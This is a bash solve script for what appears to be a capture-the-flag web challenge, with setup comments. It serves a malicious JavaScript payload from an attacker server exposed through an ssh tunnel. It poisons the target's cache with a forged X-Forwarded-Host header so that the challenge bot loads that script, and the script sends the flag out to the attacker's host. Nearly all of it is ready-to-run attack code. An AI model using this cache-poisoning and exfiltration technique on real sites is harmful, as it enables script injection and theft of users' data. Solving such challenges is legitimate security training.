# SETUP:
# Host an http server on port 80 (python -m http.server 80) inside the `exploit` directory to serve the static/viewletter.js script,
# Then expose it with something like (no extra headers needed to pass through your server as opposed to ngrok)
#			ssh -R 80:localhost:80 localhost.run -- --no-inject-http-proxy-headers

# CHANGE THESE
TARGET="127.0.0.1:1337"
MYHOST="883893f1f682a2.lhr.life"


NEXT_ID=7 # this is the default next id, if other letters have been created this has to be changed to something else

# set your remote host on the our javascript payload to extract the flag
sed -i "s@MYHOST='.*'@MYHOST='http://${MYHOST}'@" exploit/static/viewletter.js

echo "Poisoning cache"
# poison the cache with our malicious X-Forwarded-Host for the Host 127.0.0.1 so that all resource calls will be pulled from our MYHOST when id 7 is created
curl "http://${TARGET}/letters?id=${NEXT_ID}" -H 'Host: 127.0.0.1' -H "X-Forwarded-Host: ${MYHOST}" >/dev/null
curl "http://${TARGET}/letters?id=${NEXT_ID}" -H 'Host: 127.0.0.1' -H "X-Forwarded-Host: ${MYHOST}" >/dev/null

echo "Triggering backend"
# trigger the backend to check that url (letter?id=7)
curl "http://${TARGET}/submit" -H 'Content-Type: application/json' -d '{"message":"pwned"}'

# the flag should be delivered to your http server as a parameter on the request
